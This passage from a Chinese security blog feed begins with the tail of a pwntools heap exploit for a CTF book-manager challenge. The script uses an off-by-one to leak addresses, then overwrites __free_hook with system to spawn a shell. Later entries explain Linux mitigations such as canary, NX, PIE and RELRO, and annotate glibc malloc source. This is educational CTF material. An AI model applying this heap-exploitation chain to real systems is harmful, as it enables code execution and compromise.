function">init_author_name</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter author name: "</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_book</span><span class="token punctuation">(</span>name_size<span class="token punctuation">,</span>book_name<span class="token punctuation">,</span>des_size<span class="token punctuation">,</span>description<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter book name size: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>name_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter book name (Max 32 chars): "</span><span class="token punctuation">,</span>book_name<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter book description size: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>des_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter book description: "</span><span class="token punctuation">,</span>description<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete_book</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter the book id you want to delete: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit_book_description</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>description<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter the book id you want to edit: "</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter new book description: "</span><span class="token punctuation">,</span>description<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">print_book_info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># ID: 1</span>    <span class="token comment" spellcheck="true"># Name: tang</span>    <span class="token comment" spellcheck="true"># Description: new book1 edit descript</span>    <span class="token comment" spellcheck="true"># Author: tang</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">change_author_name</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># name max length = 32 off-by-one</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span><span class="token string">"5"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Enter author name: "</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 泄露book1_struct,book2_struct 地址</span>init_author_name<span class="token punctuation">(</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">32</span><span class="token punctuation">)</span>create_book<span class="token punctuation">(</span><span class="token number">140</span><span class="token punctuation">,</span><span class="token string">"tang"</span><span class="token punctuation">,</span><span class="token number">140</span><span class="token punctuation">,</span><span class="token string">"create book1"</span><span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># pwnlib.gdb.attach(proc.pidof(p)[0])</span><span class="token comment" spellcheck="true"># leak book1_struct_address</span>print_book_info<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">32</span><span class="token punctuation">)</span>tmp <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x0a"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># print_book补上的一个\n</span>book1_struct_address <span class="token operator">=</span> u64<span class="token punctuation">(</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>book2_struct_address <span class="token operator">=</span> book1_struct_address <span class="token operator">+</span> <span class="token number">0x30</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>book1_struct_address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>book2_struct_address<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create_book<span class="token punctuation">(</span><span class="token number">0x22000</span><span class="token punctuation">,</span><span class="token string">"book2 name"</span><span class="token punctuation">,</span><span class="token number">0x22000</span><span class="token punctuation">,</span><span class="token string">"create book2"</span><span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#fake book1_description</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>book2_struct_address<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>book2_struct_address<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x8c</span><span class="token punctuation">)</span>edit_book_description<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>change_author_name<span class="token punctuation">(</span><span class="token string">"B"</span><span class="token operator">*</span><span class="token number">32</span><span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># leak libc address</span>print_book_info<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Name: "</span><span class="token punctuation">)</span>tmp <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x0a"</span><span class="token punctuation">)</span>book2_name_ptr <span class="token operator">=</span> u64<span class="token punctuation">(</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>book2_name_ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 关闭PIE后的固定偏移offset计算</span>libc_base <span class="token operator">=</span> <span class="token number">0x7ffff7a0d000</span>mmap_base <span class="token operator">=</span> <span class="token number">0x7ffff7fb8010</span> <span class="token comment" spellcheck="true"># book2_name_ptr mmap address</span>offset <span class="token operator">=</span> mmap_base <span class="token operator">-</span> libc_baselibcbase <span class="token operator">=</span> book2_name_ptr <span class="token operator">-</span> offsetlog<span class="token punctuation">.</span>info<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span><span class="token punctuation">)</span>free_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libcbasesystem <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libcbasebinsh_addr <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> libcbaseedit_book_description<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 在修改book1的name_ptr指向的内存（即book2的name_ptr所存地址)为bin_sh_ptr的时候，也覆盖了book2_descripiton指针指向（关联)__free_hook</span>edit_book_description<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 接着修改上一步的_free_hook为system函数地址</span>delete_book<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 安全机制</title>
      <link href="/2019/07/22/linux-an-quan-ji-zhi/"/>
      <url>/2019/07/22/linux-an-quan-ji-zhi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>使用电脑浏览效果更佳！</p></blockquote><p>操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险，包括DEP、ASLR等。在编写漏洞利用代码的时候，需要特别注意目标进程是否开启了DEP（Linux下对应NX）、ASLR [Address space layout randomization]（Linux下对应PIE）等机制，例如存在DEP（NX）的话就不能直接执行栈上的数据，存在ASLR的话各个系统调用的地址就是随机化的，RELRO(reloctiaon read only)重定位只读，包括Full，Partial(default)，disabled，分别对应者诸如数据、got表（重定位项，对于动态链接目标文件）不可写，got表可写，全部可写。这对应了从ELF文件格式到加载到内存的映射页保护机制（r,x,w）的具体内容实现。</p><a id="more"></a><h2 id="一、checksec"><a href="#一、checksec" class="headerlink" title="一、checksec"></a>一、checksec</h2><p>checksec是一个脚本软件，也就是用脚本写的一个文件，不到2000行，可用来学习shell。</p><p>源码参见</p><p><a href="http://www.trapkit.de/tools/checksec.html" target="_blank" rel="noopener">http://www.trapkit.de/tools/checksec.html</a></p><p><a href="https://github.com/slimm609/checksec.sh/" target="_blank" rel="noopener">https://github.com/slimm609/checksec.sh/</a></p><p>下载方法之一为</p><p>wget <a href="https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz" target="_blank" rel="noopener">https://github.com/slimm609/checksec.sh/archive/1.6.tar.gz</a></p><p>checksec到底是用来干什么的？</p><p>它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。</p><p>checksec的使用方法：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216173129.png" alt=""></p><p>checksec –file /usr/sbin/sshd<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216173150.png" alt=""></p><p>一般来说，如果是学习二进制漏洞利用的朋友，建议大家使用gdb里peda插件里自带的checksec功能，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216173201.png" alt=""></p><p>下面我们就图中各个保护机制进行一个大致的了解。</p><h2 id="二、CANNARY-栈保护GS"><a href="#二、CANNARY-栈保护GS" class="headerlink" title="二、CANNARY(栈保护GS)"></a>二、CANNARY(栈保护GS)</h2><p>这个选项表示栈保护功能有没有开启。</p><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p><p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。</p><p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p><pre><code>gcc -o test test.c                        // 默认情况下，不开启Canary保护gcc -fno-stack-protector -o test test.c  //禁用栈保护gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码</code></pre><h2 id="三、FORTIFY"><a href="#三、FORTIFY" class="headerlink" title="三、FORTIFY"></a>三、FORTIFY</h2><p>fority其实非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memcpy，memset，stpcpy，strcpy，strncpy，strcat，strncat，sprintf，snprintf，vsprintf，vsnprintf，gets以及宽字符的变体。</p><p>_FORTIFY_SOURCE设为1，并且将编译器设置为优化1(<em>gcc -O1</em>)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能</p><p>_FORTIFY_SOURCE设为2，有些检查功能会加入，但是这可能导致程序崩溃。</p><p><code>gcc -D_FORTIFY_SOURCE=1</code> 仅仅只会在编译时进行检查 (特别像某些头文件 <code>#include &lt;string.h&gt;</code>)</p><p><code>gcc -D_FORTIFY_SOURCE=2</code> 程序执行时也会有检查 (如果检查到缓冲区溢出，就终止程序)</p><p>举个例子可能简单明了一些：<br>一段简单的存在缓冲区溢出的C代码</p><pre><code>void fun(char *s) {        char buf[0x100];        strcpy(buf, s);        /* Don't allow gcc to optimise away the buf */        asm volatile("" :: "m" (buf));}</code></pre><p>用包含参数-U_FORTIFY_SOURCE编译</p><pre><code>08048450 &lt;fun&gt;:  push   %ebp               ;   mov    %esp,%ebp  sub    $0x118,%esp        ; 将0x118存储到栈上  mov    0x8(%ebp),%eax     ; 将目标参数载入eax  mov    %eax,0x4(%esp)     ; 保存目标参数  lea    -0x108(%ebp),%eax  ; 数组buf  mov    %eax,(%esp)        ; 保存  call   8048320 &lt;strcpy@plt&gt;  leave                     ;   ret</code></pre><p>用包含参数-D_FORTIFY_SOURCE=2编译</p><pre><code>08048470 &lt;fun&gt;:  push   %ebp               ;   mov    %esp,%ebp  sub    $0x118,%esp        ;   movl   $0x100,0x8(%esp)   ; 把0x100当作目标参数保存  mov    0x8(%ebp),%eax     ;   mov    %eax,0x4(%esp)     ;   lea    -0x108(%ebp),%eax  ;   mov    %eax,(%esp)        ;   call   8048370 &lt;__strcpy_chk@plt&gt;  leave                      ;   ret</code></pre><p>我们可以看到gcc生成了一些附加代码，通过对数组大小的判断替换strcpy, memcpy, memset等函数名，达到防止缓冲区溢出的作用。</p><p>总结下就有:</p><pre><code>gcc -o test test.c                            // 默认情况下，不会开这个检查gcc -D_FORTIFY_SOURCE=1 -o test test.c        // 较弱的检查gcc -D_FORTIFY_SOURCE=2 -o test test.c        // 较强的检查</code></pre><h2 id="四、NX（DEP）"><a href="#四、NX（DEP）" class="headerlink" title="四、NX（DEP）"></a>四、NX（DEP）</h2><p>NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p><p>工作原理如图：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/20201216173218.png" alt=""><br>gcc编译器默认开启了NX选项，如果需要关闭NX选项，可以给gcc编译器添加-z execstack参数。<br>例如：</p><pre><code>gcc -o test test.c                    // 默认情况下，开启NX保护gcc -z execstack -o test test.c        // 禁用NX保护</code></pre><p>在Windows下，类似的概念为DEP（数据执行保护），在最新版的Visual Studio中默认开启了DEP编译选项。</p><h2 id="五、PIE（ASLR）"><a href="#五、PIE（ASLR）" class="headerlink" title="五、PIE（ASLR）"></a>五、PIE（ASLR）</h2><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p><p>内存地址随机化机制（address space layout randomization)，有以下三种情况</p><pre><code>0 - 表示关闭进程地址空间随机化。1 - 表示将mmap的基址，stack和vdso页面随机化。2 - 表示在1的基础上增加栈（heap）的随机化。</code></pre><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p><p>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p><p>liunx下关闭PIE的命令如下：</p><pre><code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></pre><p>gcc编译命令</p><pre><code>gcc -o test test.c                // 默认情况下，不开启PIEgcc -fpie -pie -o test test.c        // 开启PIE，此时强度为1gcc -fPIE -pie -o test test.c        // 开启PIE，此时为最高强度2gcc -fpic -o test test.c        // 开启PIC，此时强度为1，不会开启PIEgcc -fPIC -o test test.c        // 开启PIC，此时为最高强度2，不会开启PIE</code></pre><p>说明：</p><p>gcc中的-fpic选项，使用于在目标机支持时，编译共享库时使用。编译出的代码将通过全局偏移表(Global Offset<br>Table)中的常数地址访存，动态装载器将在程序开始执行时解析GOT表项(注意，动态装载器操作系统的一部分，连接器是GCC的一部分)。而gcc中的-fPIC选项则是针对某些特殊机型做了特殊处理，比如适合动态链接并能避免超出GOT大小限制之类的错误。而Open64仅仅支持不会导致GOT表溢出的PIC编译。</p><p>gcc中的-fpie和-fPIE选项和fpic及fPIC很相似，但不同的是，除了生成为位置无关代码外，还能假定代码是属于本程序。通常这些选项会和GCC链接时的-pie选项一起使用。fPIE选项仅能在编译可执行码时用，不能用于编译库。所以，如果想要PIE的程序，需要你除了在gcc增加-fPIE选项外，还需要在ld时增加-pie选项才能产生这种代码。即gcc -fpie -pie来编译程序。单独使用哪一个都无法达到效果。</p><h2 id="六、RELRO"><a href="#六、RELRO" class="headerlink" title="六、RELRO"></a>六、RELRO</h2><p>在Linux系统安全领域数据可以写的存储区就会是攻击的目标，尤其是存储函数指针的区域。 所以在安全防护的角度来说尽量减少可写的存储区域对安全会有极大的好处.</p><p>GCC, GNU linker以及Glibc-dynamic linker一起配合实现了一种叫做relro的技术: read only relocation。大概实现就是由linker指定binary的一块经过dynamic linker处理过 relocation之后的区域为只读.</p><p>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。RELRO为” Partial RELRO”，说明我们对GOT表具有写权限。</p><p>gcc编译：</p><pre><code>gcc -o test test.c                        // 默认情况下，是Partial RELROgcc -z norelro -o test test.c            // 关闭，即No RELROgcc -z lazy -o test test.c                // 部分开启，即Partial RELROgcc -z now -o test test.c                // 全部开启，即</code></pre><h2 id="七、Linux下动态运行机制"><a href="#七、Linux下动态运行机制" class="headerlink" title="七、Linux下动态运行机制"></a>七、Linux下动态运行机制</h2><h3 id="C的动态库编写与连接（plt与glt机制）"><a href="#C的动态库编写与连接（plt与glt机制）" class="headerlink" title="C的动态库编写与连接（plt与glt机制）"></a>C的动态库编写与连接（plt与glt机制）</h3><ol><li><p>lib的编写与编译</p><pre class="line-numbers language-c"><code class="language-c"> <span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> s<span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> 编译：</p><p> <code>gcc print.c -o libprint.so -fPIC -shared</code></p></li><li><p>主程序编写</p><pre class="line-numbers language-c"><code class="language-c"> <span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">"print.h"</span> </span><span class="token comment" spellcheck="true">// 声明函数print</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"plt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"got"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 编译：</p><p> <code>gcc main.c -o main -lprint -L.</code></p><p> 其中libxxx.so对应与自编写动态库选项 -lxxx</p></li><li><p>运行时设置共享库路径：</p><p> <a href="https://blog.csdn.net/u012707739/article/details/80148945" target="_blank" rel="noopener">参考</a> <a href="https://blog.csdn.net/hktkfly6/article/details/61922685" target="_blank" rel="noopener">2</a></p><pre class="line-numbers language-shell"><code class="language-shell"> # cat /etc/ld.so.conf include ld.so.conf.d/*.conf # echo "/usr/local/lib" >> /etc/ld.so.conf # ldconfig #共享库提前加入内存 cache：清除重新加载<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="八、总结"><a href="#八、总结" class="headerlink" title="八、总结"></a>八、总结</h2><p>各种安全选择的编译参数如下：</p><ul><li>NX：<code>-z execstack</code> / <code>-z noexecstack</code> (关闭 / 开启)</li><li>Canary：<code>-fno-stack-protector</code> /<code>-fstack-protector</code> / <code>-fstack-protector-all</code> (关闭 / 开启 / 全开启)</li><li>PIE：<code>-no-pie</code> / <code>-pie</code> (关闭 / 开启)</li><li>RELRO：<code>-z norelro</code> / <code>-z lazy</code> / <code>-z now</code> (关闭 / 部分开启 / 完全开启)</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>glibc heap pwn notes</title>
      <link href="/2019/07/20/glibc-heap-pwn-notes/"/>
      <url>/2019/07/20/glibc-heap-pwn-notes/</url>
      
        <content type="html"><![CDATA[<blockquote><p>使用电脑浏览效果更佳！</p></blockquote><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>​        记录Glibc heap的数据结构与分配过程，转自 先知社区<a href="https://xz.aliyun.com/t/2307#toc-11" target="_blank" rel="noopener">《glibc heap pwn notes》</a> 。freebuf <a href="https://www.freebuf.com/articles/system/91527.html" target="_blank" rel="noopener">Glibc堆管理机制与利用手法</a> 统一说明为glibc-2.23，更多版本添加的安全检查机制与对应绕过手法还得自己找对应libc源码阅读。</p><h3 id="heap管理数据结构"><a href="#heap管理数据结构" class="headerlink" title="heap管理数据结构"></a>heap管理数据结构</h3><ul><li><p>linux下动态链接目标文件与可执行文件在加载（ld）在虚拟内存空间的映射（map）&lt;参考&gt; 《程序员的自我修养》</p><p>  内存映射段libc.so的全局变量（.bss）的main_arena（malloc_state结构体定义，m_state）记录主线程heap的free_chunk状态。</p><p>  多线程中arena数据结构为一个环形链表，采用heap_info结构定义。</p><a id="more"></a></li></ul><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563607950559.png" alt="1563607950559"></p><ul><li><p>fast_bin的数据结构</p><p>  <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563608233033.png" alt="1563608233033"></p></li><li><p>bins的数据结构</p><ol><li>small_bin</li><li>large_bin</li><li>unsorted_bin</li></ol></li><li><p>top_chunk</p></li><li><p>last_remainder</p></li></ul><h3 id="heap分配过程"><a href="#heap分配过程" class="headerlink" title="heap分配过程"></a>heap分配过程</h3><h2 id="Malloc-源码分析"><a href="#Malloc-源码分析" class="headerlink" title="Malloc 源码分析"></a>Malloc 源码分析</h2><p>用户调用 <code>malloc</code> 时会先进入 <code>__libc_malloc</code></p><pre><code>void *__libc_malloc (size_t bytes){  mstate ar_ptr;  void *victim;  void *(*hook) (size_t, const void *)    = atomic_forced_read (__malloc_hook);  if (__builtin_expect (hook != NULL, 0))// 如果设置了 __malloc_hook 就执行然后返回    return (*hook)(bytes, RETURN_ADDRESS (0));  arena_get (ar_ptr, bytes);  victim = _int_malloc (ar_ptr, bytes);  return victim;}</code></pre><p>如果设置了 <code>__malloc_hook</code> 就执行它然后返回， 否则进入 <code>_int_malloc</code> 这个函数就是 <code>malloc</code> 的具体实现</p><pre><code>static void *_int_malloc (mstate av, size_t bytes){   /*     计算出实际需要的大小，大小按照 2 * size_t 对齐， 64位： 0x10     所以如个 malloc(0x28) ----&gt; nb = 0x30, 0x10 header + 0x20 当前块 + 0x8 下一块的 pre_size   */  checked_request2size (bytes, nb);  /*     如果是第一次触发 malloc, 就会调用 sysmalloc---&gt; mmap 分配内存返回     */  if (__glibc_unlikely (av == NULL))    {      void *p = sysmalloc (nb, av);      if (p != NULL)    alloc_perturb (p, bytes);      return p;    }</code></pre><p>首先把传入的 <code>bytes</code> 转换为 <code>chunk</code> 的实际大小，保存到 <code>nb</code> 里面。然后如果是第一次调用 <code>malloc</code> , 就会进入 <code>sysmalloc</code> 分配内存。</p><h3 id="搜索Fastbin"><a href="#搜索Fastbin" class="headerlink" title="搜索Fastbin"></a>搜索Fastbin</h3><p>接着会看申请的 <code>nb</code> 是不是在 <code>fastbin</code> 里面，如果是进入 <code>fastbin</code> 的处理流程</p><pre><code>if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))    {      idx = fastbin_index (nb);  // 找到nb 对应的 fastbin 的 索引 idx      mfastbinptr *fb = &amp;fastbin (av, idx);// 找到对应的 fastbin 的指针      mchunkptr pp = *fb;      do        {          victim = pp;          if (victim == NULL)            break;        }      while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))             != victim);      if (victim != 0) //如果 fastbin 非空，就进入这里        {          if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))// 判断大小是否满足 fastbin相应bin的大小要求            {              errstr = "malloc(): memory corruption (fast)";            errout:              malloc_printerr (check_action, errstr, chunk2mem (victim), av);              return NULL;            }          check_remalloced_chunk (av, victim, nb);          void *p = chunk2mem (victim);          alloc_perturb (p, bytes);          return p;        }    }</code></pre><p>首先根据 <code>nb</code> 找到该大小对应的 <code>fastbin</code> 的项， 然后看看该 <code>fastbin</code> 